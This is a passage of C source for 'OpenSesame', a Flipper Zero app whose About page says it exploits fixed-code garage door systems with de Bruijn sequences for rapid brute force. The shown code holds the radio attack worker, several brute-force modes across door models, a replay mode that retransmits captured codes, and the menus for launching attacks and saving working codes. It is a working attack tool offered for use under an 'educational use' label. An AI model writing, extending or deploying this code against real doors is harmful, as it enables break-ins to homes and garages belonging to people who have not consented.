                    return 0;
                }
            }

            uint32_t digit_idx = i % num_codes;
            uint8_t digit = sequence[digit_idx];

            if(i < n) {
                code_register = (code_register * k) + digit;
            } else {
                code_register = ((code_register % divisor) * k) + digit;
            }

            if(i >= (uint32_t)(n - 1)) {
                app->current_code = code_register;
                app->codes_transmitted++;
                opensesame_push_code_to_buffer(app, code_register);
            }

            bit_offset = opensesame_append_digit_pattern(digit, current_target, chunk_buffer, bit_offset);

            if((i + 1) % digits_per_chunk == 0) {
                opensesame_transmit_raw(current_target->frequency, chunk_buffer, bytes_per_chunk);
                memset(chunk_buffer, 0, bytes_per_chunk);
                bit_offset = 0;
                furi_delay_ms(5);
            }
        }

        if(bit_offset > 0) {
            size_t final_bytes = (bit_offset + 7) / 8;
            opensesame_transmit_raw(current_target->frequency, chunk_buffer, final_bytes);
        }

        free(chunk_buffer);
        free(sequence);
        
        FURI_LOG_I("OpenSesame", "Completed target %d", target_idx);
        
        // Delay between targets in meta-modes
        if((is_all_known || is_generic_brute) && target_idx < target_end) { // Renamed
            // Don't delay if the next target is a meta-target we're skipping
            if(target_idx + 1 != 4 && target_idx + 1 != 5) {
                furi_delay_ms(100);
            }
        }
    }

    FURI_LOG_I("OpenSesame", "de Bruijn attack completed");
    return 0;
}

static int32_t opensesame_worker_replay(OpenSesameApp* app, const OpenSesameTarget* target) {
    // FIXED: Check if user selected a meta-target (index 4 or 5)
    if(app->current_target_index >= 4) {
        FURI_LOG_E("OpenSesame", "Replay invalid for 'All Known' or 'Generic'. Select a specific target.");
        return -1;
    }

    uint32_t code_to_replay = app->saved_code[app->current_target_index];

    if(code_to_replay == 0) {
        FURI_LOG_W("OpenSesame", "No saved code for this target");
        return -1;
    }

    size_t total_bits_per_payload = target->bits * target->length;
    size_t payload_size_bytes = (total_bits_per_payload + 7) / 8;
    
    uint8_t* payload_buffer = malloc(payload_size_bytes);
    if(payload_buffer == NULL) {
        FURI_LOG_E("OpenSesame", "Failed to allocate payload buffer");
        return -1;
    }

    app->current_code = code_to_replay;
    app->max_code = 5; // For display
    app->codes_transmitted = 0; // For display

    opensesame_generate_payload(code_to_replay, target, payload_buffer, payload_size_bytes);

    for(int i = 0; i < 5; i++) {
        if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;
        app->codes_transmitted++;
        opensesame_push_code_to_buffer(app, code_to_replay);
        opensesame_transmit_raw(target->frequency, payload_buffer, payload_size_bytes);
        furi_delay_ms(50);
    }

    free(payload_buffer);
    return 0;
}

// --- Worker Thread ---
static int32_t opensesame_worker_thread(void* context) {
    if(context == NULL) return -1;
    
    OpenSesameApp* app = (OpenSesameApp*)context;
    
    app->current_attack_target_idx = app->current_target_index;
    app->code_buffer.head = 0;
    app->code_buffer.count = 0;

    // --- MODIFIED: max_code calculation for all modes ---
    bool is_all_known = (app->current_target_index == 4);
    bool is_generic_brute = (app->current_target_index == 5);
    
    if(is_all_known) {
        app->max_code = 0;
        // Check targets 0, 1, 2, 3
        for(uint8_t i = 0; i < 4; i++) {
            const OpenSesameTarget* t = &opensesame_targets[i];
            const uint8_t n = t->bits;
            const uint8_t k = t->trinary ? 3 : 2;
            
            // --- Logic to filter targets based on mode ---
            if((!t->trinary && n > 13) || (t->trinary && n > 8)) {
                if(app->attack_mode == AttackModeDeBruijn) continue; // Skip if too big for de Bruijn
            }
            if((!t->trinary && n > 31) || (t->trinary && n > 19)) {
                 continue; // Skip if too large for pow()
            }
            app->max_code += (uint32_t)pow(k, n);
        }
        FURI_LOG_I("OpenSesame", "All Known mode, aggregate max_code: %lu", app->max_code);

    } else if (is_generic_brute) {
        app->max_code = 0;
        // NEW: Loop over *all* targets, skipping meta-targets
        for(uint8_t i = 0; i < opensesame_total_target_count; i++) {
            if(i == 4 || i == 5) continue; // Skip meta-targets
            
            const OpenSesameTarget* t = &opensesame_targets[i];
            const uint8_t n = t->bits;
            const uint8_t k = t->trinary ? 3 : 2;
            
            // --- Logic to filter targets based on mode ---
            if((!t->trinary && n > 13) || (t->trinary && n > 8)) {
                if(app->attack_mode == AttackModeDeBruijn) continue; // Skip if too big for de Bruijn
            }
            if((!t->trinary && n > 31) || (t->trinary && n > 19)) {
                 continue; // Skip if too large for pow()
            }
            app->max_code += (uint32_t)pow(k, n);
        }
        FURI_LOG_I("OpenSesame", "Generic Brute mode, aggregate max_code: %lu", app->max_code);

    } else {
        // Single Target
        const OpenSesameTarget* target = &opensesame_targets[app->current_target_index];
        const uint8_t n = target->bits;
        const uint8_t k = target->trinary ? 3 : 2;

        if((!target->trinary && n > 31) || (target->trinary && n > 19)) {
            FURI_LOG_W("OpenSesame", "Target bits (%d) too large, setting max_code to 0", n);
            app->max_code = 0;
        } else {
            app->max_code = (uint32_t)pow(k, n);
        }
    }
    // --- End of max_code calculation ---

    const OpenSesameTarget* target = &opensesame_targets[app->current_target_index];
    int32_t result = 0;

    switch(app->attack_mode) {
    case AttackModeCompatibility:
        result = opensesame_worker_compatibility(app, target);
        break;
    case AttackModeStream:
        result = opensesame_worker_stream(app, target);
        break;
    case AttackModeDeBruijn:
        result = opensesame_worker_debruijn(app, target);
        break;
    case AttackModeReplay:
        result = opensesame_worker_replay(app, target);
        break;
    default:
        result = -1;
        break;
    }

    // --- Save logic ---
    if(app->save_requested) {
        uint8_t target_to_save = app->current_attack_target_idx;

        // FIXED: Ensure target is valid (0-3)
        if(target_to_save < 4 && app->code_buffer.count > 0) {
            
            // Get the *oldest* code from the buffer (head)
            uint32_t oldest_idx = app->code_buffer.head;
            uint32_t code_to_save = app->code_buffer.codes[oldest_idx];
            
            app->saved_code[target_to_save] = code_to_save;
            opensesame_save_codes(app);
            FURI_LOG_I("OpenSesame", "Saved code 0x%lX (from ~10s ago) for target %d", code_to_save, target_to_save);
        
        } else {
            FURI_LOG_W("OpenSesame", "Save requested, but no code in buffer or invalid target index (%d)", target_to_save);
        }
        app->save_requested = false;
    }
    // --- End of save logic ---

    app->is_attacking = false;
    return result;
}

// --- Attack Mode Input ---
static bool attack_mode_input_callback(InputEvent* event, void* context);
static void attack_mode_widget_setup(OpenSesameApp* app);

static bool attack_mode_input_callback(InputEvent* event, void* context) {
    OpenSesameApp* app = (OpenSesameApp*)context;
    if(event->type != InputTypeShort) return false;

    if(event->key == InputKeyLeft) {
        app->attack_mode = (app->attack_mode + AttackModeCount - 1) % AttackModeCount;
        attack_mode_widget_setup(app);
        return true;
    }

    if(event->key == InputKeyRight) {
        app->attack_mode = (app->attack_mode + 1) % AttackModeCount;
        attack_mode_widget_setup(app);
        return true;
    }

    if(event->key == InputKeyOk) {
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
        return true;
    }

    return false;
}

// --- Target Input ---
static bool target_input_callback(InputEvent* event, void* context);
static void target_widget_setup(OpenSesameApp* app);

static bool target_input_callback(InputEvent* event, void* context) {
    OpenSesameApp* app = (OpenSesameApp*)context;
    if(event->type != InputTypeShort) return false;

    if(event->key == InputKeyLeft) {
        app->current_target_index = (app->current_target_index + opensesame_target_count - 1) % opensesame_target_count;
        target_widget_setup(app);
        return true;
    }

    if(event->key == InputKeyRight) {
        app->current_target_index = (app->current_target_index + 1) % opensesame_target_count;
        target_widget_setup(app);
        return true;
    }

    if(event->key == InputKeyOk) {
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
        return true;
    }

    return false;
}

// --- Widget Setup ---
static void attack_mode_widget_setup(OpenSesameApp* app) {
    widget_reset(app->attack_mode_widget);

    char mode_text[256];
    snprintf(mode_text, sizeof(mode_text),
        "%s\n\n%s\n\n[L/R] Change [OK] OK",
        attack_mode_names[app->attack_mode],
        attack_mode_desc[app->attack_mode]);

    widget_add_text_box_element(
        app->attack_mode_widget,
        0, 0, 128, 64,
        AlignCenter, AlignTop,
        mode_text,
        false);
}

// --- MODIFIED: Updated target widget text for new modes ---
static void target_widget_setup(OpenSesameApp* app) {
    widget_reset(app->target_widget);

    const OpenSesameTarget* target = &opensesame_targets[app->current_target_index];

    char info_text[256];
    int offset = 0;
    
    offset += snprintf(info_text + offset, sizeof(info_text) - offset,
        "%s\n\n",
        target->name);
    
    // "All Known Models" (Index 4)
    if(app->current_target_index == 4) {
        // --- MODIFIED: Rephrased warning ---
        offset += snprintf(info_text + offset, sizeof(info_text) - offset,
            "Cycles all 4 known targets\n"
            "Usually most effective in\n"
            "Full de Bruijn mode\n\n");
    // "Generic (Brute)" (Index 5) - Renamed
    } else if(app->current_target_index == 5) {
         // --- MODIFIED: Rephrased warning ---
         offset += snprintf(info_text + offset, sizeof(info_text) - offset,
            "Cycles known models then\n"
            "brute-forces generic\n"
            "keyspaces. VERY LONG.\n"
            "Usually most effective\n"
            "in Full de Bruijn mode.\n\n");
    // Specific Targets (Index 0-3)
    } else {
        offset += snprintf(info_text + offset, sizeof(info_text) - offset,
            "%lu.%03lu MHz\n"
            "%s (%u bits)\n\n",
            target->frequency / 1000000, 
            (target->frequency % 1000000) / 1000,
            target->encoding_desc,
            target->bits);
        
        if(app->saved_code[app->current_target_index] != 0) {
            offset += snprintf(info_text + offset, sizeof(info_text) - offset,
                "Saved: 0x%lX\n\n",
                app->saved_code[app->current_target_index]);
        }
    }
    
    snprintf(info_text + offset, sizeof(info_text) - offset,
        "[L/R] Change [OK] OK");

    widget_add_text_box_element(
        app->target_widget,
        0, 0, 128, 64,
        AlignCenter, AlignTop,
        info_text,
        false);
}

// --- MODIFIED: Attack View progress logic ---
static void attack_view_draw_callback(Canvas* canvas, void* model) {
    if(canvas == NULL || model == NULL) return;
    
    OpenSesameApp* app = *((OpenSesameApp**)model);
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, attack_mode_names[app->attack_mode]);
    
    canvas_set_font(canvas, FontSecondary);
    
    char info[64];
    bool is_meta_mode = (app->current_target_index == 4 || app->current_target_index == 5);

    if(app->attack_mode == AttackModeReplay) {
        snprintf(info, sizeof(info), "Code: 0x%lX", app->current_code);
        canvas_draw_str_aligned(canvas, 64, 20, AlignCenter, AlignTop, info);
        snprintf(info, sizeof(info), "Sent: %lu / %lu", app->codes_transmitted, app->max_code);
        canvas_draw_str_aligned(canvas, 64, 32, AlignCenter, AlignTop, info);
    
    } else if(app->attack_mode == AttackModeDeBruijn || is_meta_mode) {
        // De Bruijn mode OR any meta-mode (All Known, Generic)
        snprintf(info, sizeof(info), "Codes: %lu / %lu", app->codes_transmitted, app->max_code);
        canvas_draw_str_aligned(canvas, 64, 20, AlignCenter, AlignTop, info);
        
        CodeBuffer* buffer = &app->code_buffer;
        if(buffer->count > 0) {
            uint32_t idx1 = (buffer->head + buffer->count - 1) % CODE_BUFFER_SIZE;
            snprintf(info, sizeof(info), "Last: 0x%lX", buffer->codes[idx1]);
            canvas_draw_str(canvas, 5, 35, info);
        }
        if(buffer->count > 1) {
            uint32_t idx2 = (buffer->head + buffer->count - 2) % CODE_BUFFER_SIZE;
            snprintf(info, sizeof(info), "Prev: 0x%lX", buffer->codes[idx2]);
            canvas_draw_str(canvas, 5, 45, info);
        }
    } else {
        // Single target, Compatibility or Stream mode
        snprintf(info, sizeof(info), "Progress: %lu / %lu", app->current_code, app->max_code);
        canvas_draw_str_aligned(canvas, 64, 20, AlignCenter, AlignTop, info);
        
        CodeBuffer* buffer = &app->code_buffer;
        if(buffer->count > 0) {
            uint32_t idx1 = (buffer->head + buffer->count - 1) % CODE_BUFFER_SIZE;
            snprintf(info, sizeof(info), "Last: 0x%lX", buffer->codes[idx1]);
            canvas_draw_str(canvas, 5, 35, info);
        }
        if(buffer->count > 1) {
            uint32_t idx2 = (buffer->head + buffer->count - 2) % CODE_BUFFER_SIZE;
            snprintf(info, sizeof(info), "Prev: 0x%lX", buffer->codes[idx2]);
            canvas_draw_str(canvas, 5, 45, info);
        }
    }
    
    if(app->is_attacking) {
        canvas_set_font(canvas, FontSecondary);
        if(app->save_requested) {
            canvas_draw_str(canvas, 5, 63, "Saving... [BACK] Stop");
        } else {
            canvas_draw_str(canvas, 5, 63, "[OK] Save [BACK] Stop");
        }
    } else {
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 5, 63, "Complete! Press BACK");
    }
}

static bool attack_view_input_callback(InputEvent* event, void* context) {
    if(context == NULL || event == NULL) return false;
    
    OpenSesameApp* app = (OpenSesameApp*)context;
    
    if(event->type == InputTypeShort || event->type == InputTypeLong) {
        if(event->key == InputKeyBack) {
            if(app->is_attacking && app->worker_thread != NULL) {
                FURI_LOG_I("OpenSesame", "Stopping attack via BACK");
                app->save_requested = false;
                
                FuriThreadId thread_id = furi_thread_get_id(app->worker_thread);
                if(thread_id != NULL) {
                    furi_thread_flags_set(thread_id, WORKER_EVENT_STOP);
                }
                furi_delay_ms(100);
            }
            
            if(app->worker_thread != NULL) {
                furi_thread_join(app->worker_thread);
                furi_thread_free(app->worker_thread);
                app->worker_thread = NULL;
            }
            
            app->is_attacking = false;
            app->save_requested = false;
            
            view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
            return true;
        } else if(event->key == InputKeyOk) {
            if(app->is_attacking && !app->save_requested) {
                FURI_LOG_I("OpenSesame", "Save requested");
                app->save_requested = true;
                
                if(app->worker_thread != NULL) {
                    FuriThreadId thread_id = furi_thread_get_id(app->worker_thread);
                    if(thread_id != NULL) {
                        furi_thread_flags_set(thread_id, WORKER_EVENT_STOP);
                    }
                }
            }
            return true;
        }
    }

    return false;
}

static void attack_view_enter_callback(void* context) {
    if(context == NULL) return;
    
    OpenSesameApp* app = (OpenSesameApp*)context;
    
    FURI_LOG_I("OpenSesame", "Attack view entered");
    
    view_set_update_callback(app->attack_view, NULL);
    view_set_update_callback_context(app->attack_view, app);
}

static void attack_view_exit_callback(void* context) {
    if(context == NULL) return;
    
    OpenSesameApp* app = (OpenSesameApp*)context;
    
    FURI_LOG_I("OpenSesame", "Attack view exiting");
    
    view_set_update_callback(app->attack_view, NULL);
    view_set_update_callback_context(app->attack_view, NULL);

    if(app->worker_thread != NULL) {
        if(app->is_attacking) {
            FURI_LOG_W("OpenSesame", "Force stopping worker thread on exit");
            app->save_requested = false;
            
            FuriThreadId thread_id = furi_thread_get_id(app->worker_thread);
            if(thread_id != NULL) {
                furi_thread_flags_set(thread_id, WORKER_EVENT_STOP);
            }
            furi_delay_ms(200);
        }
        
        furi_thread_join(app->worker_thread);
        furi_thread_free(app->worker_thread);
        app->worker_thread = NULL;
    }

    app->is_attacking = false;
    app->save_requested = false;
}

// --- Code Buffer View ---
static void buffer_view_draw_callback(Canvas* canvas, void* model) {
    if(canvas == NULL || model == NULL) return;
    
    OpenSesameApp* app = *((OpenSesameApp**)model);
    CodeBuffer* buffer = &app->code_buffer;
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, "Save Code");
    
    canvas_set_font(canvas, FontSecondary);
    
    if(buffer->count == 0) {
        canvas_draw_str_aligned(canvas, 64, 30, AlignCenter, AlignTop, "No codes in buffer");
    } else {
        char info[32];
        snprintf(info, sizeof(info), "Recent codes (%lu):", buffer->count);
        canvas_draw_str(canvas, 5, 18, info);
        
        for(uint8_t i = 0; i < 3 && i < buffer->count; i++) {
            uint32_t idx = (buffer->head + buffer->count - 1 - i) % CODE_BUFFER_SIZE;
            char line[32];
            
            if(i == app->selected_buffer_index) {
                snprintf(line, sizeof(line), "> 0x%lX", buffer->codes[idx]);
            } else {
                snprintf(line, sizeof(line), "  0x%lX", buffer->codes[idx]);
            }
            canvas_draw_str(canvas, 5, 30 + (i * 10), line);
        }
    }
    
    canvas_draw_str(canvas, 5, 63, "[U/D] Scroll [OK] Save");
}

static bool buffer_view_input_callback(InputEvent* event, void* context) {
    if(context == NULL || event == NULL) return false;
    
    OpenSesameApp* app = (OpenSesameApp*)context;
    CodeBuffer* buffer = &app->code_buffer;
    if(event->type != InputTypeShort) return false;

    if(event->key == InputKeyUp) {
        if(app->selected_buffer_index < buffer->count - 1) {
            app->selected_buffer_index++;
            view_commit_model(app->buffer_view, true);
        }
        return true;
    } else if(event->key == InputKeyDown) {
        if(app->selected_buffer_index > 0) {
            app->selected_buffer_index--;
            view_commit_model(app->buffer_view, true);
        }
        return true;
    } else if(event->key == InputKeyOk) {
        if(buffer->count > 0 && app->selected_buffer_index < buffer->count) {
            uint32_t buffer_idx = (buffer->head + buffer->count - 1 - app->selected_buffer_index) % CODE_BUFFER_SIZE;
            uint32_t code_to_save = buffer->codes[buffer_idx];

            // Check for meta-targets (index 4 or 5)
            if(app->current_target_index < 4) {
                app->saved_code[app->current_target_index] = code_to_save;
                opensesame_save_codes(app);

                FURI_LOG_I("OpenSesame", "Saved code 0x%lX for target %d", 
                    code_to_save, app->current_target_index);
                
                view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdSavedCodes);
                return true;
            } else {
                FURI_LOG_W("OpenSesame", "Cannot save from buffer in 'All Known' or 'Generic' mode");
            }
        }
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
    } else if(event->key == InputKeyBack) {
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
        return true;
    }

    return false;
}

// --- MODIFIED: Saved Codes View (Header/Footer Removed, Y-Pos Fixed) ---
static void saved_codes_view_draw_callback(Canvas* canvas, void* model) {
    if(canvas == NULL || model == NULL) return;
    
    OpenSesameApp* app = *((OpenSesameApp**)model);
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);
    
    char line_buffer[48];
    // Loop over the 4 saveable targets (0-3)
    for(uint8_t i = 0; i < 4; i++) {
        const OpenSesameTarget* target = &opensesame_targets[i];
        
        char short_name[16];
        snprintf(short_name, sizeof(short_name), "%s", target->name);
        if(strlen(target->name) > 12) {
            short_name[9] = '.';
            short_name[10] = '.';
            short_name[11] = '\0';
        }
        
        if(app->saved_code[i] != 0) {
            snprintf(line_buffer, sizeof(line_buffer), "%s: 0x%lX", short_name, app->saved_code[i]);
        } else {
            snprintf(line_buffer, sizeof(line_buffer), "%s: None", short_name);
        }
        // --- MODIFIED: Adjusted Y-offset to account for removed header ---
        canvas_draw_str(canvas, 5, 10 + (i * 12), line_buffer); // Start lower down
    }
    
    // --- REMOVED FOOTER ---
}

static bool saved_codes_view_input_callback(InputEvent* event, void* context) {
    UNUSED(context);
    if(event == NULL) return false;
    if(event->type != InputTypeShort) return false;
    
    return false;
}

// --- Config View ---
static void config_widget_setup(OpenSesameApp* app);
static void directions_widget_setup(OpenSesameApp* app);

static bool config_input_callback(InputEvent* event, void* context) {
    OpenSesameApp* app = (OpenSesameApp*)context;
    if(event == NULL || event->type != InputTypeShort) return false;

    if(event->key == InputKeyOk || event->key == InputKeyBack) {
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);
        return true;
    }
    return false;
}

static bool about_input_callback(InputEvent* event, void* context) {
    OpenSesameApp* app = (OpenSesameApp*)context;
    if(event == NULL) return false;
    
    if(event->type == InputTypeShort) {
        if(event->key == InputKeyLeft) {
            app->about_page = (app->about_page + 3) % 4; // 4 pages
            about_widget_setup(app);
            return true;
        }
        if(event->key == InputKeyRight) {
            app->about_page = (app->about_page + 1) % 4; // 4 pages
            about_widget_setup(app);
            return true;
        }
    }
    
    return false;
}

static void config_widget_setup(OpenSesameApp* app) {
    widget_reset(app->config_widget);

    const OpenSesameTarget* target = &opensesame_targets[app->current_target_index];

    char config_text[256];
    snprintf(config_text, sizeof(config_text),
        "Current Config\n\n"
        "Target:\n%s\n\n"
        "Mode:\n%s\n\n"
        "[OK] Return",
        target->name,
        attack_mode_names[app->attack_mode]);

    widget_add_text_box_element(
        app->config_widget,
        0, 0, 128, 64,
        AlignCenter, AlignTop,
        config_text,
        false);
}

static void about_widget_setup(OpenSesameApp* app) {
    widget_reset(app->about_widget);

    const char* about_texts[4] = {
        // Page 0: Thank You
        "Thank You\n\n"
        "Original concept:\n"
        "Samy Kamkar\n"
        "samy.pl/opensesame\n\n"

        "[L/R] Pages\n"
        "[BACK] Return",
        
        // Page 1: About
        "About OpenSesame\n\n"
        "Exploits fixed-code\n"
        "garage door systems\n"
        "using de Bruijn\n"
        "sequences for rapid\n"
        "brute-force.\n\n"
        "[L/R] Pages\n"
        "[BACK] Return",
        
        // Page 2: Features
        "Features\n\n"
        "- Multiple targets\n"
        "- 4 attack modes\n"
        "- Code saving\n"
        "- Replay function\n\n"
        "[L/R] Pages\n"
        "[BACK] Return",
        
        // Page 3: License
        "License\n\n"
        "GNU GPL v2\n"
        "June 1991\n\n"
        "Educational use.\n"
        "Use responsibly.\n\n"
        "[L/R] Pages\n"
        "[BACK] Return"
    };

    widget_add_text_box_element(
        app->about_widget,
        0, 0, 128, 64,
        AlignCenter, AlignTop,
        about_texts[app->about_page],
        false);
}

static void directions_widget_setup(OpenSesameApp* app) {
    UNUSED(app);
    widget_reset(app->directions_widget);

    const char* directions_text =
        "Quick Start\n\n"
        "1. Select target\n"
        "   model\n\n"
        "2. Choose mode\n\n"
        "3. Start attack\n\n"
        "4. Press OK to\n"
        "   save codes\n\n"
        "[BACK] Return";

    widget_add_text_box_element(
        app->directions_widget,
        0, 0, 128, 64,
        AlignCenter, AlignTop,
        directions_text,
        false);
}

// --- View Dispatcher Callbacks ---
static uint32_t opensesame_back_callback(void* context) {
    UNUSED(context);
    return ViewIdMenu;
}

static uint32_t opensesame_exit_callback(void* context) {
    UNUSED(context);
    return VIEW_NONE; // This exits the app
}

static void opensesame_submenu_callback(void* context, uint32_t index) {
    OpenSesameApp* app = (OpenSesameApp*)context;
    furi_assert(app);

    switch(index) {
    case SubmenuIndexStartAttack:
        app->is_attacking = true;
        app->current_code = 0;
        app->codes_transmitted = 0;
        app->attack_animation_index = 0;
        app->save_requested = false;
        app->worker_thread = furi_thread_alloc_ex(
            "OpenSesameWorker", 4096, opensesame_worker_thread, app);
        if(app->worker_thread != NULL) {
            furi_thread_start(app->worker_thread);
            view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdAttack);
        } else {
            FURI_LOG_E("OpenSesame", "Failed to allocate worker thread");
            app->is_attacking = false;
        }
        break;
    case SubmenuIndexAttackMode:
        attack_mode_widget_setup(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdAttackMode);
        break;
    case SubmenuIndexTargetSelect:
        target_widget_setup(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdTargetSelect);
        break;
    case SubmenuIndexShowConfig:
        config_widget_setup(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdConfig);
        break;
    case SubmenuIndexCodeBuffer:
        app->selected_buffer_index = 0; // Reset selection
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdCodeBuffer);
        break;
    case SubmenuIndexSavedCodes:
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdSavedCodes);
        break;
    case SubmenuIndexDirections:
        directions_widget_setup(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdDirections);
        break;
    case SubmenuIndexAbout:
        app->about_page = 0;
        about_widget_setup(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdAbout);
        break;
    case SubmenuIndexExit:
        view_dispatcher_stop(app->view_dispatcher);
        break;
    default:
        break;
    }
}

// --- App Allocation ---
static OpenSesameApp* opensesame_app_alloc() {
    OpenSesameApp* app = malloc(sizeof(OpenSesameApp));
    furi_assert(app);
    memset(app, 0, sizeof(OpenSesameApp));

    app->current_target_index = 0;
    app->attack_mode = AttackModeDeBruijn;
    app->is_attacking = false;
    app->save_requested = false;
    app->worker_thread = NULL;
    app->attack_animation_chars = "|/-\\";
    app->attack_animation_index = 0;
    app->selected_buffer_index = 0;
    app->about_page = 0;
    app->codes_transmitted = 0;
    app->current_attack_target_idx = 0;

    opensesame_load_codes(app);

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    // Submenu
    app->submenu = submenu_alloc();
    submenu_set_header(app->submenu, "OpenSesame");
    submenu_add_item(app->submenu, "Start Attack", SubmenuIndexStartAttack, 
        opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "Attack Mode", SubmenuIndexAttackMode, 
        opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "Garage Door Model", SubmenuIndexTargetSelect, 
        opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "Show Config", SubmenuIndexShowConfig, 
        opensesame_submenu_callback, app);
    // HIDDEN: Code Buffer
    // submenu_add_item(app->submenu, "Code Buffer (Save)", SubmenuIndexCodeBuffer, 
    //     opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "View Saved Codes", SubmenuIndexSavedCodes, 
        opensesame_submenu_callback, app);
    // HIDDEN: Directions
    // submenu_add_item(app->submenu, "Directions", SubmenuIndexDirections, 
    //     opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "About", SubmenuIndexAbout, 
        opensesame_submenu_callback, app);
    submenu_add_item(app->submenu, "Exit", SubmenuIndexExit, 
        opensesame_submenu_callback, app);
    view_set_previous_callback(submenu_get_view(app->submenu), opensesame_exit_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdMenu, submenu_get_view(app->submenu));

    // Attack Mode Widget
    app->attack_mode_widget = widget_alloc();
    view_set_context(widget_get_view(app->attack_mode_widget), app);
    view_set_previous_callback(widget_get_view(app->attack_mode_widget), opensesame_back_callback);
    view_set_input_callback(widget_get_view(app->attack_mode_widget), attack_mode_input_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdAttackMode, 
        widget_get_view(app->attack_mode_widget));

    // Target Widget
    app->target_widget = widget_alloc();
    view_set_context(widget_get_view(app->target_widget), app);
    view_set_previous_callback(widget_get_view(app->target_widget), opensesame_back_callback);
    view_set_input_callback(widget_get_view(app->target_widget), target_input_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdTargetSelect, 
        widget_get_view(app->target_widget));

    // Config Widget
    app->config_widget = widget_alloc();
    view_set_context(widget_get_view(app->config_widget), app);
    view_set_previous_callback(widget_get_view(app->config_widget), opensesame_back_callback);
    view_set_input_callback(widget_get_view(app->config_widget), config_input_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdConfig, 
        widget_get_view(app->config_widget));

    // About Widget
    app->about_widget = widget_alloc();
    view_set_context(widget_get_view(app->about_widget), app);
    view_set_previous_callback(widget_get_view(app->about_widget), opensesame_back_callback);
    view_set_input_callback(widget_get_view(app->about_widget), about_input_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdAbout, 
        widget_get_view(app->about_widget));

    // Directions Widget
    app->directions_widget = widget_alloc();
    view_set_context(widget_get_view(app->directions_widget), app);
    view_set_previous_callback(widget_get_view(app->directions_widget), opensesame_back_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdDirections, 
        widget_get_view(app->directions_widget));

    // Code Buffer View
    app->buffer_view = view_alloc();
    view_allocate_model(app->buffer_view, ViewModelTypeLockFree, sizeof(OpenSesameApp*));
    OpenSesameApp** buffer_model = view_get_model(app->buffer_view);
    *buffer_model = app;
    view_set_context(app->buffer_view, app);
    view_set_draw_callback(app->buffer_view, buffer_view_draw_callback);
    view_set_input_callback(app->buffer_view, buffer_view_input_callback);
    view_set_previous_callback(app->buffer_view, opensesame_back_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdCodeBuffer, app->buffer_view);

    // Saved Codes View
    app->saved_codes_view = view_alloc();
    view_allocate_model(app->saved_codes_view, ViewModelTypeLockFree, sizeof(OpenSesameApp*));
    OpenSesameApp** saved_model = view_get_model(app->saved_codes_view);
    *saved_model = app;
    view_set_context(app->saved_codes_view, app);
    view_set_draw_callback(app->saved_codes_view, saved_codes_view_draw_callback);
    view_set_input_callback(app->saved_codes_view, saved_codes_view_input_callback);
    view_set_previous_callback(app->saved_codes_view, opensesame_back_callback);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdSavedCodes, app->saved_codes_view);

    // Attack View
    app->attack_view = view_alloc();
    view_allocate_model(app->attack_view, ViewModelTypeLockFree, sizeof(OpenSesameApp*));
    OpenSesameApp** attack_model = view_get_model(app->attack_view);
    *attack_model = app;
    view_set_context(app->attack_view, app);
    view_set_draw_callback(app->attack_view, attack_view_draw_callback);
    view_set_input_callback(app->attack_view, attack_view_input_callback);
    view_set_enter_callback(app->attack_view, attack_view_enter_callback);
    view_set_exit_callback(app->attack_view, attack_view_exit_callback);
    view_set_previous_callback(app->attack_view, NULL);
    view_dispatcher_add_view(app->view_dispatcher, ViewIdAttack, app->attack_view);

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdMenu);

    return app;
}

static void opensesame_app_free(OpenSesameApp* app) {
    if(app == NULL) return;

    if(app->worker_thread != NULL) {
        FuriThreadId thread_id = furi_thread_get_id(app->worker_thread);
        if(thread_id != NULL) {
            furi_thread_flags_set(thread_id, WORKER_EVENT_STOP);
        }
        furi_thread_join(app->worker_thread);
        furi_thread_free(app->worker_thread);
    }

    view_dispatcher_remove_view(app->view_dispatcher, ViewIdMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdAttackMode);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdTargetSelect);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdConfig);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdCodeBuffer);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdSavedCodes);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdAttack);
